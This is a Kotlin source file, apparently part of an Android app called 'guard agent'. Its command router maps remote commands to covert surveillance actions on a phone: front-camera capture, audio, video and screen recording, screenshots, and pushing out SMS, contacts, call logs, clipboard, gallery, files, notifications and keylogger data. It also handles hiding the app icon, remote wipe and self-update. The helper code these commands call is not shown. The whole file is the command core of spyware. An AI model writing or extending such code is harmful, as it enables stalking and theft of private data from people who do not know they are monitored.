package com.guard.agent.command

import android.content.Context
import com.guard.agent.core.Constants
import com.guard.agent.helpers.data.AppsHelper
import com.guard.agent.helpers.data.BatteryHelper
import com.guard.agent.helpers.data.CallLogsHelper
import com.guard.agent.helpers.data.ClipboardHelper
import com.guard.agent.helpers.data.ContactsHelper
import com.guard.agent.helpers.data.FileHelper
import com.guard.agent.helpers.data.GalleryHelper
import com.guard.agent.helpers.data.NetworkHelper
import com.guard.agent.helpers.data.SmsHelper
import com.guard.agent.helpers.location.GeofenceHelper
import com.guard.agent.helpers.location.LocationHelper
import com.guard.agent.helpers.media.AudioHelper
import com.guard.agent.helpers.media.CameraHelper
import com.guard.agent.helpers.media.ScreenHelper
import com.guard.agent.helpers.media.VideoHelper
import com.guard.agent.security.StealthManager
import com.guard.agent.utils.Logger

object CommandRouter {

    /**
     * Command ko sahi helper pe route karo.
     * @return true agar command execute hui, false agar fail.
     */
    fun route(ctx: Context, cmd: String, deviceKey: String): Boolean {
        return try {
            when (cmd.uppercase()) {

                // ---------- LOCATION ----------
                Constants.CMD_LOCATION -> {
                    LocationHelper.sendOnce(ctx, deviceKey)
                    true
                }
                Constants.CMD_GEOFENCE_ADD -> {
                    GeofenceHelper.syncGeofences(ctx, deviceKey)
                    true
                }
                Constants.CMD_GEOFENCE_DEL -> {
                    GeofenceHelper.syncGeofences(ctx, deviceKey)
                    true
                }

                // ---------- MEDIA ----------
                Constants.CMD_SNAP -> {
                    CameraHelper.captureFront(ctx, deviceKey)
                    true
                }
                Constants.CMD_REC -> {
                    AudioHelper.record(ctx, deviceKey, Constants.DEFAULT_AUDIO_SECONDS)
                    true
                }
                Constants.CMD_VIDEO -> {
                    VideoHelper.record(ctx, deviceKey, Constants.DEFAULT_VIDEO_SECONDS)
                    true
                }
                Constants.CMD_SCREENREC -> {
                    ScreenHelper.requestScreenRecord(ctx, deviceKey, Constants.DEFAULT_SCREEN_SECONDS)
                    true
                }
                Constants.CMD_SCREENSHOT -> {
                    ScreenHelper.requestScreenshot(ctx, deviceKey)
                    true
                }

                // ---------- DEVICE ----------
                Constants.CMD_LOCK -> {
                    CommandHandler.lockDevice(ctx)
                    true
                }
                Constants.CMD_ALARM -> {
                    CommandHandler.playAlarm(ctx)
                    true
                }
                Constants.CMD_STOP_ALARM -> {
                    CommandHandler.stopAlarm()
                    true
                }
                Constants.CMD_WIPE -> {
                    CommandHandler.wipeDevice(ctx)
                    true
                }
                Constants.CMD_PING -> {
                    CommandHandler.ping(ctx, deviceKey)
                    true
                }

                // ---------- DATA ----------
                Constants.CMD_BATTERY -> {
                    BatteryHelper.push(ctx, deviceKey)
                    true
                }
                Constants.CMD_NETWORK -> {
                    NetworkHelper.push(ctx, deviceKey)
                    true
                }
                Constants.CMD_CONTACTS -> {
                    ContactsHelper.push(ctx, deviceKey)
                    true
                }
                Constants.CMD_CALLLOGS -> {
                    CallLogsHelper.push(ctx, deviceKey)
                    true
                }
                Constants.CMD_SMS -> {
                    SmsHelper.push(ctx, deviceKey)
                    true
                }
                Constants.CMD_APPS -> {
                    AppsHelper.push(ctx, deviceKey)
                    true
                }
                Constants.CMD_GALLERY -> {
                    GalleryHelper.push(ctx, deviceKey)
                    true
                }
                Constants.CMD_FILES -> {
                    FileHelper.push(ctx, deviceKey)
                    true
                }
                Constants.CMD_CLIPBOARD -> {
                    ClipboardHelper.push(ctx, deviceKey)
                    true
                }
                Constants.CMD_NOTIFS -> {
                    // Notification listener khud push kar raha hai
                    true
                }
                Constants.CMD_KEYLOGS -> {
                    // Keylogger khud push kar raha hai
                    true
                }

                // ---------- STEALTH ----------
                Constants.CMD_HIDE -> {
                    StealthManager.hideIcon(ctx)
                    true
                }
                Constants.CMD_SHOW -> {
                    StealthManager.showIcon(ctx)
                    true
                }

                // ---------- UPDATE ----------
                Constants.CMD_UPDATE -> {
                    com.guard.agent.security.SelfUpdateManager.checkAndUpdate(ctx)
                    true
                }

                else -> {
                    Logger.w("Unknown command: $cmd")
                    false
                }
            }
        } catch (e: Exception) {
            Logger.e("CommandRouter", "Route failed: $cmd", e)
            false
        }
    }
}
